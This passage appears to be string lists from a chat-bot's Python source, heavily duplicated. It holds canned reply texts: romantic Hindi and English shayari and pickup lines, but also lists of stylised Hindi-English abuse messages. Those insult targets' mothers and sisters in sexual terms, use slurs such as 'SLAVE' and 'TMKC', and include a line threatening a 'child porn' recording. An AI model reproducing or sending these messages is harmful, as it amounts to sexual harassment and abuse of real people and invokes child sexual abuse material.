            "तेरे मां के दूदू के बीच मेरा lund fas gaya oops 🤪（ ͜.🍆 ͜.）",
            "𝐓ᴇʀʏ 𝐁ʜᴇ𝐍 𝐊ᴇ ( ͜. ㅅ ͜. )🥛 ʏᴜᴍᴍʏ ",
            "𓂃☁︎ 𓂃𝐒ɪᴅᴇ 𝐇ᴀᴛ 𝐆ᴜʟᴀᴍ 𝐓ᴇʀʏ 𝐌ᴀᴀ 𝐊ᴏ 𝐂ʜᴏᴅɴᴇ  मेरी रेलगाड़ी आ रही .-‘🚂-‘.ᯓᡣ𐭩______ 𓂃☁︎ 𓂃",
            "˙✧˖°📷༘ ⋆｡° 𝐓ᴇʀʏ 𝐌ᴀ  𝐊ᴀ 𝐂ʜɪʟᴅ 𝐏ᴏʀɴ 𝐑ᴇᴄᴏʀᴅ 𝐇ᴏɢʏᴀ 𝐀ʙ 𝐓ᴏ 𝐒ɪᴅʜᴀ 𝐕ɪʀᴀʟ 𝐇ᴏɢᴀ 𝐘ᴇ ˙✧˖°📷༘ ⋆｡°",
            "𓂃✍︎ 𝑵ʏ 𝑵ʏ 𝑨ʙ 𝑲ᴜᴄʜ 𝑵ʏ 𝑯ᴏ 𝑺ᴋᴛᴀ 𝑻ᴇʀɪ  𝑪ᴜᴅᴀɪ 𝑲ɪ 𝑺ᴄʀɪᴘᴛ 𝑨ʙ 𝑳ᴇᴀᴋ 𝑯ᴏᴋᴇ 𝑯ʏ 𝑴ᴀɴᴇɢɪ 𓂃✍︎",
            "⋆⭒˚.⋆🔭 𝐒ʜᴜᴛ 𝐔ᴘ 𝐑ᴀɴᴅɪᴋᴇ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐊ɪ 𝐂ʜᴜᴅᴀɪ 𝐄ɴᴊᴏʏ 𝐊ʀ 𝐑ᴀʜᴀ 𝐓ᴇʟᴇ𝐒ᴄᴏᴘᴇ 𝐒ᴇ⋆⭒˚.⋆🔭",
            "तेरे मां के दूदू के बीच मेरा lund fas gaya oops 🤪（ ͜.🍆 ͜.）",
            "𝐓ᴇʀʏ 𝐁ʜᴇ𝐍 𝐊ᴇ ( ͜. ㅅ ͜. )🥛 ʏᴜᴍᴍʏ ",
            "𓂃☁︎ 𓂃𝐒ɪᴅᴇ 𝐇ᴀᴛ 𝐆ᴜʟᴀᴍ 𝐓ᴇʀʏ 𝐌ᴀᴀ 𝐊ᴏ 𝐂ʜᴏᴅɴᴇ  मेरी रेलगाड़ी आ रही .-‘🚂-‘.ᯓᡣ𐭩______ 𓂃☁︎ 𓂃",
            "˙✧˖°📷༘ ⋆｡° 𝐓ᴇʀʏ 𝐌ᴀ  𝐊ᴀ 𝐂ʜɪʟᴅ 𝐏ᴏʀɴ 𝐑ᴇᴄᴏʀᴅ 𝐇ᴏɢʏᴀ 𝐀ʙ 𝐓ᴏ 𝐒ɪᴅʜᴀ 𝐕ɪʀᴀʟ 𝐇ᴏɢᴀ 𝐘ᴇ ˙✧˖°📷༘ ⋆｡°",
            "𓂃✍︎ 𝑵ʏ 𝑵ʏ 𝑨ʙ 𝑲ᴜᴄʜ 𝑵ʏ 𝑯ᴏ 𝑺ᴋᴛᴀ 𝑻ᴇʀɪ  𝑪ᴜᴅᴀɪ 𝑲ɪ 𝑺ᴄʀɪᴘᴛ 𝑨ʙ 𝑳ᴇᴀᴋ 𝑯ᴏᴋᴇ 𝑯ʏ 𝑴ᴀɴᴇɢɪ 𓂃✍︎",
            "⋆⭒˚.⋆🔭 𝐒ʜᴜᴛ 𝐔ᴘ 𝐑ᴀɴᴅɪᴋᴇ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐊ɪ 𝐂ʜᴜᴅᴀɪ 𝐄ɴᴊᴏʏ 𝐊ʀ 𝐑ᴀʜᴀ 𝐓ᴇʟᴇ𝐒ᴄᴏᴘᴇ 𝐒ᴇ⋆⭒˚.⋆🔭",
            "तेरे मां के दूदू के बीच मेरा lund fas gaya oops 🤪（ ͜.🍆 ͜.）",
            "𝐓ᴇʀʏ 𝐁ʜᴇ𝐍 𝐊ᴇ ( ͜. ㅅ ͜. )🥛 ʏᴜᴍᴍʏ ",
            "𓂃☁︎ 𓂃𝐒ɪᴅᴇ 𝐇ᴀᴛ 𝐆ᴜʟᴀᴍ 𝐓ᴇʀʏ 𝐌ᴀᴀ 𝐊ᴏ 𝐂ʜᴏᴅɴᴇ  मेरी रेलगाड़ी आ रही .-‘🚂-‘.ᯓᡣ𐭩______ 𓂃☁︎ 𓂃",
            "˙✧˖°📷༘ ⋆｡° 𝐓ᴇʀʏ 𝐌ᴀ  𝐊ᴀ 𝐂ʜɪʟᴅ 𝐏ᴏʀɴ 𝐑ᴇᴄᴏʀᴅ 𝐇ᴏɢʏᴀ 𝐀ʙ 𝐓ᴏ 𝐒ɪᴅʜᴀ 𝐕ɪʀᴀʟ 𝐇ᴏɢᴀ 𝐘ᴇ ˙✧˖°📷༘ ⋆｡°",
            "𓂃✍︎ 𝑵ʏ 𝑵ʏ 𝑨ʙ 𝑲ᴜᴄʜ 𝑵ʏ 𝑯ᴏ 𝑺ᴋᴛᴀ 𝑻ᴇʀɪ  𝑪ᴜᴅᴀɪ 𝑲ɪ 𝑺ᴄʀɪᴘᴛ 𝑨ʙ 𝑳ᴇᴀᴋ 𝑯ᴏᴋᴇ 𝑯ʏ 𝑴ᴀɴᴇɢɪ 𓂃✍︎",
            "⋆⭒˚.⋆🔭 𝐒ʜᴜᴛ 𝐔ᴘ 𝐑ᴀɴᴅɪᴋᴇ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐊ɪ 𝐂ʜᴜᴅᴀɪ 𝐄ɴᴊᴏʏ 𝐊ʀ 𝐑ᴀʜᴀ 𝐓ᴇʟᴇ𝐒ᴄᴏᴘᴇ 𝐒ᴇ⋆⭒˚.⋆🔭"
        ]

        flag_texts = [
            " ོ༘₊⁺🇮🇳 ₊⁺⋆.˚ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐊ᴇ 𝐒ᴀᴛʜ  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  𝐁ᴀᴀᴘ 𝐀ᴜʀ  𝐈ɴᴅɪᴀ 𝐖ᴀʟᴇ 𝐁ʜɪ 𝐂ʜɪʟʟ 𝐊ᴀʀ 𝐑ʜᴇ ོ༘₊⁺🇮🇳 ₊⁺⋆.˚",
            " ོ༘₊⁺🇯🇵 ₊⁺⋆.˚ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐊ᴇ 𝐒ᴀᴛʜ   ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  𝐁ᴀᴀᴘ 𝐀ᴜʀ 𝐉ᴀᴘᴀɴ 𝐖ᴀʟᴇ 𝐁ʜɪ 𝐂ʜɪʟʟ 𝐊ᴀʀ 𝐑ʜᴇ ོ༘₊⁺🇯🇵 ₊⁺⋆. ",
            " ₊⁺🇺🇸 ₊⁺⋆.˚ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐊ᴇ 𝐒ᴀᴛʜ   ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  𝐁ᴀᴀᴘ 𝐀ᴜʀ 𝐔𝐒𝐀 𝐖ᴀʟᴇ 𝐁ʜɪ 𝐂ʜɪʟʟ 𝐊ᴀʀ 𝐑ʜᴇ ོ༘₊⁺🇺🇸 ₊⁺⋆.˚",
            " ོ༘₊⁺🇬🇧 ₊⁺⋆.˚ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐊ᴇ 𝐒ᴀᴛʜ   ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  𝐁ᴀᴀᴘ 𝐀ᴜʀ 𝐔𝐊 𝐖ᴀʟᴇ 𝐁ʜɪ 𝐂ʜɪʟʟ 𝐊ᴀʀ 𝐑ʜᴇ ོ༘₊⁺🇬🇧 ₊⁺⋆.˚",
            " ོ༘₊⁺🇰🇷 ₊⁺⋆.˚𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐊ᴇ 𝐒ᴀᴛʜ    ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  𝐁ᴀᴀᴘ 𝐀ᴜʀ 𝐊ᴏʀᴇᴀ 𝐖ᴀʟᴇ 𝐁ʜɪ 𝐂ʜɪʟʟ 𝐊ᴀʀ 𝐑ʜᴇ ོ༘₊⁺🇰🇷 ₊⁺⋆.˚",
            " ོ༘₊⁺🇩🇪 ₊⁺⋆.˚ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐊ᴇ 𝐒ᴀᴛʜ   ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  𝐁ᴀᴀᴘ 𝐀ᴜʀ 𝐆ᴇʀᴍᴀɴʏ 𝐖ᴀʟᴇ 𝐁ʜɪ 𝐂ʜɪʟʟ 𝐊ᴀʀ 𝐑ʜᴇ ོ༘₊⁺🇩🇪 ₊⁺⋆.˚",
            " ོ༘₊⁺🇫🇷 ₊⁺⋆.˚𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐊ᴇ 𝐒ᴀᴛʜ    ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  𝐁ᴀᴀᴘ 𝐀ᴜʀ 𝐅ʀᴀɴᴄᴇ 𝐖ᴀʟᴇ 𝐁ʜɪ 𝐂ʜɪʟʟ 𝐊ᴀʀ 𝐑ʜᴇ ོ༘₊⁺🇫🇷 ₊⁺⋆.˚",
            " ོ༘₊⁺🇮🇹 ₊⁺⋆.˚ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐊ᴇ 𝐒ᴀᴛʜ   ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  𝐁ᴀᴀᴘ 𝐀ᴜʀ 𝐈ᴛᴀʟʏ 𝐖ᴀʟᴇ 𝐁ʜɪ 𝐂ʜɪʟʟ 𝐊ᴀʀ 𝐑ʜᴇ ོ༘₊⁺🇮🇹 ₊⁺⋆.˚",
            " ོ༘₊⁺🇧🇷 ₊⁺⋆.˚𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐊ᴇ 𝐒ᴀᴛʜ    ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  𝐁ᴀᴀᴘ 𝐀ᴜʀ 𝐁ʀᴀᴢɪʟ 𝐖ᴀʟᴇ 𝐁ʜɪ 𝐂ʜɪʟʟ 𝐊ᴀʀ 𝐑ʜᴇ ོ༘₊⁺🇧🇷 ₊⁺⋆.˚",
            " ོ༘₊⁺🇨🇦 ₊⁺⋆.˚𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐊ᴇ 𝐒ᴀᴛʜ   ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  𝐁ᴀᴀᴘ 𝐀ᴜʀ 𝐂ᴀɴᴀᴅᴀ 𝐖ᴀʟᴇ 𝐁ʜɪ 𝐂ʜɪʟʟ 𝐊ᴀʀ 𝐑ʜᴇ ོ༘₊⁺🇨🇦 ₊⁺⋆.˚",
            " ོ༘₊⁺🇮🇳 ₊⁺⋆.˚ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐊ᴇ 𝐒ᴀᴛʜ  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  𝐁ᴀᴀᴘ 𝐀ᴜʀ  𝐈ɴᴅɪᴀ 𝐖ᴀʟᴇ 𝐁ʜɪ 𝐂ʜɪʟʟ 𝐊ᴀʀ 𝐑ʜᴇ ོ༘₊⁺🇮🇳 ₊⁺⋆.˚",
            " ོ༘₊⁺🇯🇵 ₊⁺⋆.˚ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐊ᴇ 𝐒ᴀᴛʜ   ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  𝐁ᴀᴀᴘ 𝐀ᴜʀ 𝐉ᴀᴘᴀɴ 𝐖ᴀʟᴇ 𝐁ʜɪ 𝐂ʜɪʟʟ 𝐊ᴀʀ 𝐑ʜᴇ ོ༘₊⁺🇯🇵 ₊⁺⋆. ",
            " ₊⁺🇺🇸 ₊⁺⋆.˚ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐊ᴇ 𝐒ᴀᴛʜ   ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  𝐁ᴀᴀᴘ 𝐀ᴜʀ 𝐔𝐒𝐀 𝐖ᴀʟᴇ 𝐁ʜɪ 𝐂ʜɪʟʟ 𝐊ᴀʀ 𝐑ʜᴇ ོ༘₊⁺🇺🇸 ₊⁺⋆.˚",
            " ོ༘₊⁺🇬🇧 ₊⁺⋆.˚ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐊ᴇ 𝐒ᴀᴛʜ   ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  𝐁ᴀᴀᴘ 𝐀ᴜʀ 𝐔𝐊 𝐖ᴀʟᴇ 𝐁ʜɪ 𝐂ʜɪʟʟ 𝐊ᴀʀ 𝐑ʜᴇ ོ༘₊⁺🇬🇧 ₊⁺⋆.˚",
            " ོ༘₊⁺🇰🇷 ₊⁺⋆.˚𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐊ᴇ 𝐒ᴀᴛʜ    ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  𝐁ᴀᴀᴘ 𝐀ᴜʀ 𝐊ᴏʀᴇᴀ 𝐖ᴀʟᴇ 𝐁ʜɪ 𝐂ʜɪʟʟ 𝐊ᴀʀ 𝐑ʜᴇ ོ༘₊⁺🇰🇷 ₊⁺⋆.˚",
            " ོ༘₊⁺🇩🇪 ₊⁺⋆.˚ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐊ᴇ 𝐒ᴀᴛʜ   ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  𝐁ᴀᴀᴘ 𝐀ᴜʀ 𝐆ᴇʀᴍᴀɴʏ 𝐖ᴀʟᴇ 𝐁ʜɪ 𝐂ʜɪʟʟ 𝐊ᴀʀ 𝐑ʜᴇ ོ༘₊⁺🇩🇪 ₊⁺⋆.˚",
            " ོ༘₊⁺🇫🇷 ₊⁺⋆.˚𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐊ᴇ 𝐒ᴀᴛʜ    ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  𝐁ᴀᴀᴘ 𝐀ᴜʀ 𝐅ʀᴀɴᴄᴇ 𝐖ᴀʟᴇ 𝐁ʜɪ 𝐂ʜɪʟʟ 𝐊ᴀʀ 𝐑ʜᴇ ོ༘₊⁺🇫🇷 ₊⁺⋆.˚",
            " ོ༘₊⁺🇮🇹 ₊⁺⋆.˚ 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐊ᴇ 𝐒ᴀᴛʜ   ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  𝐁ᴀᴀᴘ 𝐀ᴜʀ 𝐈ᴛᴀʟʏ 𝐖ᴀʟᴇ 𝐁ʜɪ 𝐂ʜɪʟʟ 𝐊ᴀʀ 𝐑ʜᴇ ོ༘₊⁺🇮🇹 ₊⁺⋆.˚",
            " ོ༘₊⁺🇧🇷 ₊⁺⋆.˚𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐊ᴇ 𝐒ᴀᴛʜ    ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  𝐁ᴀᴀᴘ 𝐀ᴜʀ 𝐁ʀᴀᴢɪʟ 𝐖ᴀʟᴇ 𝐁ʜɪ 𝐂ʜɪʟʟ 𝐊ᴀʀ 𝐑ʜᴇ ོ༘₊⁺🇧🇷 ₊⁺⋆.˚",
            " ོ༘₊⁺🇨🇦 ₊⁺⋆.˚𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐊ᴇ 𝐒ᴀᴛʜ   ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  𝐁ᴀᴀᴘ 𝐀ᴜʀ 𝐂ᴀɴᴀᴅᴀ 𝐖ᴀʟᴇ 𝐁ʜɪ 𝐂ʜɪʟʟ 𝐊ᴀʀ 𝐑ʜᴇ ོ༘₊⁺🇨🇦 ₊⁺⋆.˚"
        ]

        heart_replies = [
            "𓂃˖˳·˖ ִֶָ ⋆❤️͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ 𝐒𝐋𝐀𝐕𝐄 ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝐓𝐌𝐊𝐂 -/- ⋆˚❤️ ݁˖⭑.ᐟ",
            "𓂃˖˳·˖ ִֶָ ⋆🧡͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ 𝐒𝐋𝐀𝐕𝐄 ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝐓𝐌𝐊𝐂 -/- ⋆˚🧡 ݁˖⭑.ᐟ",
            "𓂃˖˳·˖ ִֶָ ⋆💛͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ 𝐒𝐋𝐀𝐕𝐄 ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝐓𝐌𝐊𝐂 -/- ⋆˚💛 ݁˖⭑.ᐟ",
            "𓂃˖˳·˖ ִֶָ ⋆💚͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ 𝐒𝐋𝐀𝐕𝐄 ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝐓𝐌𝐊𝐂 -/- ⋆˚💚 ݁˖⭑.ᐟ",
            "𓂃˖˳·˖ ִֶָ ⋆💙͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ 𝐒𝐋𝐀𝐕𝐄 ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝐓𝐌𝐊𝐂 -/- ⋆˚💙 ݁˖⭑.ᐟ",
            "𓂃˖˳·˖ ִֶָ ⋆💜͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ 𝐒𝐋𝐀𝐕𝐄 ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝐓𝐌𝐊𝐂 -/- ⋆˚💜 ݁˖⭑.ᐟ",
            "𓂃˖˳·˖ ִֶָ ⋆🖤͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ 𝐒𝐋𝐀𝐕𝐄 ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝐓𝐌𝐊𝐂 -/- ⋆˚🖤 ݁˖⭑.ᐟ",
            "𓂃˖˳·˖ ִֶָ ⋆🤍͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ 𝐒𝐋𝐀𝐕𝐄 ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝐓𝐌𝐊𝐂 -/- ⋆˚🤍 ݁˖⭑.ᐟ",
            "𓂃˖˳·˖ ִֶָ ⋆🤎͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ 𝐒𝐋𝐀𝐕𝐄 ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝐓𝐌𝐊𝐂 -/- ⋆˚🤎 ݁˖⭑.ᐟ",
            "𓂃˖˳·˖ ִֶָ ⋆💖͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ 𝐒𝐋𝐀𝐕𝐄 ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝐓𝐌𝐊𝐂 -/- ⋆˚💖 ݁˖⭑.ᐟ",
            "𓂃˖˳·˖ ִֶָ ⋆💗͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ 𝐒𝐋𝐀𝐕𝐄 ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝐓𝐌𝐊𝐂 -/- ⋆˚💗 ݁˖⭑.ᐟ",
            "𓂃˖˳·˖ ִֶָ ⋆💓͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ 𝐒𝐋𝐀𝐕𝐄 ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝐓𝐌𝐊𝐂 -/- ⋆˚💓 ݁˖⭑.ᐟ",
            "𓂃˖˳·˖ ִֶָ ⋆💞͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ 𝐒𝐋𝐀𝐕𝐄 ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝐓𝐌𝐊𝐂 -/- ⋆˚💞 ݁˖⭑.ᐟ",
            "𓂃˖˳·˖ ִֶָ ⋆💕͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ 𝐒𝐋𝐀𝐕𝐄 ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝐓𝐌𝐊𝐂 -/- ⋆˚💕 ݁˖⭑.ᐟ",
            "𓂃˖˳·˖ ִֶָ ⋆💘͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ 𝐒𝐋𝐀𝐕𝐄 ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝐓𝐌𝐊𝐂 -/- ⋆˚💘 ݁˖⭑.ᐟ",
            "𓂃˖˳·˖ ִֶָ ⋆💝͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ 𝐒𝐋𝐀𝐕𝐄 ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝐓𝐌𝐊𝐂 -/- ⋆˚💝 ݁˖⭑.ᐟ",
            "𓂃˖˳·˖ ִֶָ ⋆💟͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ 𝐒𝐋𝐀𝐕𝐄 ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝐓𝐌𝐊𝐂 -/- ⋆˚💟 ݁˖⭑.ᐟ",
            "𓂃˖˳·˖ ִֶָ ⋆❣️͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ 𝐒𝐋𝐀𝐕𝐄 ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝐓𝐌𝐊𝐂 -/- ⋆˚❣️ ݁˖⭑.ᐟ",
            "𓂃˖˳·˖ ִֶָ ⋆❤️‍🔥͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ 𝐒𝐋𝐀𝐕𝐄 ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝐓𝐌𝐊𝐂 -/- ⋆˚❤️‍🔥 ݁˖⭑.ᐟ",
            "𓂃˖˳·˖ ִֶָ ⋆❤️‍🩹͙⋆ ִֶָ˖·˳˖𓂃 ִֶָ⁀➴༯ 𝐒𝐋𝐀𝐕𝐄 ִֶָ. ..𓂃 ࣪ ִֶָ🌈་༘࿐ 𝐓𝐌𝐊𝐂 -/- ⋆˚❤️‍🩹 ݁˖⭑.ᐟ"
        ]

        shayari_texts = [
            "तेरी आँखों की गहराई में, मेरी दुनिया बसी है,\nहर सांस में तू बसी है, तू ही मेरी हँसी है। 💕",
            "प्यार में क्या रखा है, ये तो हमें पता नहीं,\nबस तेरे बिना लगता है, जीना भी सज़ा नहीं। 💔",
            "चाँद से खूबसूरत है तेरा चेहरा,\nतू है तो दुनिया लगती है मेरी। 🌙",
            "तेरी यादों में खोया रहूँ,\nतू मिले तो ये जहाँ भूल जाऊँ। 💭",
            "प्यार का हर लम्हा तेरे साथ जीया,\nतेरी बातों में खुद को खोया। 🥀",
            "तेरे बिना ये दिल है बेक़रार,\nतू आए तो मिलेगा करार। ❤️",
            "हर दिन तुझसे प्यार बढ़े,\nहर सांस तुझसे निभे। 💗",
            "तेरी हँसी में जान है,\nतेरी बातों में पहचान है। 😊",
            "तेरी बाहों में मिली राहत,\nतेरी आँखों में मिला सुकून। 🌹",
            "तू है तो हर ग़म भूला,\nतू है तो ये दिल झूला। 🎠",
            "हर रोज़ तुझसे प्यार हो,\nहर शाम तुझपे निसार हो। 🌅",
            "तेरी मुस्कान है जादू,\nजो बिखेरे हर दिन बहार। 🌺",
            "मैं तुझमें खो जाऊँ,\nतू मुझमें खो जाए,\nबस यही है प्यार की ख्वाहिश। 💞",
            "तेरी आँखों की गहराई में,\nमेरी दुनिया बसी है। 🌌",
            "तेरे बिना ये दिल है अकेला,\nतू आए तो मिले झूला। 🎵",
            "Your love is the poetry my heart always wanted to write. 📝💖",
            "In a world full of trends, I want to remain your timeless classic. 🌟",
            "You are the missing piece of my soul, the calm in my chaos. 🧩",
            "Every love story is beautiful, but ours is my favorite chapter. 📖",
            "You are the sun in my day, the moon in my night, and the stars in my dreams. 🌞🌙",
            "Meeting you was fate, becoming your friend was a choice, but falling in love with you was beyond my control. 💫",
            "I didn't choose you, my heart did. And it doesn't know how to unchoose. ❤️‍🔥",
            "You are not just my love; you are my home. 🏠",
            "Your smile is the best part of my day, and your laugh is my favorite sound. 😄🎶",
            "I could search my whole life, but I know I'd never find someone like you. 🔍✨",
            "You are the answer to every question my heart never knew to ask. 🙋‍♀️💘",
            "With you, every moment feels like a dream I never want to wake up from. 🌈",
            "You are my today and all of my tomorrows. 📅❤️",
            "The best thing about me is you. 👫",
            "If I had to choose between breathing and loving you, I would use my last breath to say I love you. 💀🗣️",
            "Teri yaad aati hai, raat bhi jaag jaati hai,\nDil mein teri hi baatein, neend bhi bhag jaati hai. 💤💕",
            "Pyaar mein kya rakha hai, mujhko nahi pata,\nPar tere bina toh lagta, zindagi hai saza. 😩❤️",
            "Tu hai toh lagta hai, saara jahaan mera,\nTu nahi toh lagta, jaise koi khwab adhoora. 🌍💫",
            "Meri har subah tu, meri har shaam tu,\nMeri har dua mein, bas tera hi naam tu. ☀️🌙",
            "Tera smile dekh ke lagta hai, jaise mera wifi full signal pe aa gaya. 📶😄",
            "Pyaar kya hai? Maine tujhse jaana,\nTera naam sunke hi dil ho jaata hai deewana. 🫀",
            "Tu hai toh din hai, warna toh har pal hai night shift. 🌃",
            "Dil ki baat kehni thi, bas yahi socha,\nTujhse milke samjha, pyaar kya hai bhai! 🥰",
            "Teri ek smile pe, main de doon jaan bhi,\nPar tu maange toh, de doon duniya bhi. 😄🌎",
            "Chand se chura ke laaya hoon, teri muskaan,\nRakh lo dil mein, yeh hai meri jaan. 🌙💖",
            "Tere bina dil hai veeran, tu aaja ve,\nDil ki yeh raah, hai bas teri hi ore. 🛤️💔",
            "Pyaar ka sabak mila, tujhse hi yaar,\nAb toh bas tera hi hai, yeh dil bekarar. 🫀",
            "Kya baat hai tujh mein, hai koi jaadu,\nDekhta hi rahu, na ho mera wajood. 👀✨",
            "Tu hi meri subah, tu hi mera sukoon,\nTere bina toh jaise, khaali hai yeh khwabon ka jahoon. ☁️",
            "Kehte hain pyaar mein aankhen band hoti hain,\nPar tujh mein toh maine, duniya poori dekhi hai. 🌟"
        ]

        rizz_texts = [
            "क्या तुम सड़क हो? क्योंकि मैं हर दिन तुम्हें क्रॉस करना चाहता हूँ। 😏",
            "तुम्हारी हँसी सुनकर लगता है जैसे मेरा दिन बन गया। 😄",
            "तुम्हारी आँखों में खो जाऊँ तो वापस न आऊँ। 👀",
            "क्या तुम्हारे पास कोई मैप है? क्योंकि मैं तुम्हारे दिल में खो गया हूँ। 🗺️",
            "तुम बिना makeup के भी परफेक्ट हो – लेकिन मैं तो तुम्हें हर तरह से चाहता हूँ। 💋",
            "मैं तुमसे प्यार नहीं करता – मैं तो तुम्हें worship करता हूँ। 🙌",
            "तुम मेरे दिन की सबसे अच्छी notification हो। 🔔",
            "तुम मेरे सबसे पसंदीदा गाने की धुन हो। 🎶",
            "मैं तुम्हें चाँद से भी ऊपर रखता हूँ – क्योंकि तुम तो सूरज हो। ☀️",
            "तुम मेरी रूह की तसल्ली हो – बस साथ रहो। 🕊️",
            "तुम्हें देखते ही मेरा दिल धड़कता है – क्या डॉक्टर के पास चलें? ❤️‍🔥",
            "तुम मेरी दुनिया हो – और मैं तुम्हारा दीवाना। 😍",
            "तुम्हारा नाम सुनते ही दिल करता है कुछ खास करूँ। 💥",
            "तुम्हारी बातों में ऐसा क्या है, जो मुझे पागल कर देती है। 🌀",
            "क्या तुम चॉकलेट हो? क्योंकि मैं तुम्हें हर वक़्त खाना चाहता हूँ। 🍫",
            "Are you a magician? Because whenever I look at you, everyone else disappears. 🎩✨",
            "Do you have a map? I keep getting lost in your eyes. 🗺️👀",
            "Is your name Google? Because you have everything I'm searching for. 🔍💕",
            "Are you a camera? Because every time I look at you, I smile. 📸😊",
            "If beauty were a crime, you'd be serving a life sentence. ⛓️🔥",
            "Do you believe in love at first sight, or should I walk by again? 🚶‍♂️🔄",
            "Excuse me, but I think you dropped something – my jaw. 👇😮",
            "Are you Wi-Fi? Because I'm feeling a connection. 📶❤️",
            "If you were a vegetable, you'd be a cute-cumber! 🥒😉",
            "Can I follow you home? Cause my parents always told me to follow my dreams. 🏠💭",
            "Is your dad a baker? Because you're a cutie pie! 🥧😋",
            "You must be a 10 because you've got me feeling like a 1 with you. 1️⃣0️⃣",
            "Roses are red, violets are blue, sugar is sweet, and so are you. 🌹💙",
            "I must be a snowflake because I've fallen for you. ❄️💘",
            "Are you a time traveler? Because I see you in my future. ⏳🔮",
            "Tera naam kya hai? \nKyunki mera plan hai tera baap banana! 😎👀",
            "Kya tum Google ho? \nKyunki mujhe tum mein woh sab milta hai jo main dhundh raha tha. 🔍💕",
            "Tum toh mere WiFi jaisi ho, \nBina tumhare connection hi nahi aata. 📶😏",
            "Kya tum chocolate ho? \nKyunki main toh din raat tumhe kha sakta hoon. 🍫😋",
            "Tumhari smile dekh ke lagta hai, \nMera din set aur raat forget. 🌞",
            "Main driver nahi hoon, \nPar tumhare dil ki steering le sakta hoon? 🚗💨",
